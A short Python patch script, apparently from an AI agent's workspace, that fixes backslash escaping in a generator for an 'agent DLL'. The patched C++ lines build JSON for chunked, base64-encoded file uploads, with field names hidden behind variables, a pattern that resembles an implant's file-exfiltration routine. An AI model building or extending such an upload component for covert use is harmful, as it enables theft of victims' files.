with open('C:/agent-workspace/generate_agent_dll.py', 'r', encoding='utf-8') as f:
    content = f.read()

# The _up() function has single backslashes where it needs double backslashes
# We need to replace the init_body line and the chunk body line in _up()

# Fix 1: init_body in _up
old_init = 'std::string init_body = "{{\\"" + std::string(fcg) + "\\":\\"" + job->guid + "\\",\\"" + std::string(fcf) + "\\":\\"" + sbn + "\\",\\"" + std::string(fct) + "\\":" + std::to_string(total) + "}}";'
new_init = 'std::string init_body = "{{\\\\\\"" + std::string(fcg) + "\\\\\\":\\\\\\"" + job->guid + "\\\\\\",\\\\\\"" + std::string(fcf) + "\\\\\\":\\\\\\"" + sbn + "\\\\\\",\\\\\\"" + std::string(fct) + "\\\\\\":" + std::to_string(total) + "}}";'

content = content.replace(old_init, new_init)

# Fix 2: chunk body in _up
old_chunk = 'std::string body = "{{\\"" + std::string(fcg) + "\\":\\"" + job->guid + "\\",\\"" + std::string(fcf) + "\\":\\"" + sbn + "\\",\\"" + std::string(fco) + "\\":" + std::to_string(offset) + ",\\"" + std::string(fcc) + "\\":\\"" + chunk_b64 + "\\"}}";'
new_chunk = 'std::string body = "{{\\\\\\"" + std::string(fcg) + "\\\\\\":\\\\\\"" + job->guid + "\\\\\\",\\\\\\"" + std::string(fcf) + "\\\\\\":\\\\\\"" + sbn + "\\\\\\",\\\\\\"" + std::string(fco) + "\\\\\\":" + std::to_string(offset) + ",\\\\\\"" + std::string(fcc) + "\\\\\\":\\\\\\"" + chunk_b64 + "\\\\\\"}}";'

content = content.replace(old_chunk, new_chunk)

with open('C:/agent-workspace/generate_agent_dll.py', 'w', encoding='utf-8', newline='\n') as f:
    f.write(content)

print('generator fixed')

